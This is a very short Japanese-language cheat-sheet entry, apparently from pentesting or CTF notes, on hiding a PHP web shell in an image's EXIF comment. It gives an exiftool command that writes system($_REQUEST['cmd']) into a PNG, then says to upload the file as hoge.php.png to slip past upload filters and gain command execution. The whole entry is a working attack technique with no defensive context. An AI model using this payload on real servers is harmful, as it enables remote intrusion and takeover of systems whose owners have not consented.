# Other technic

## exif情報
exifに埋め込む

```
$ exiftool -Comment='<?php system($_REQUEST['cmd']); ?>' hoge.png
```

これでhoge.php.pngとしてupload
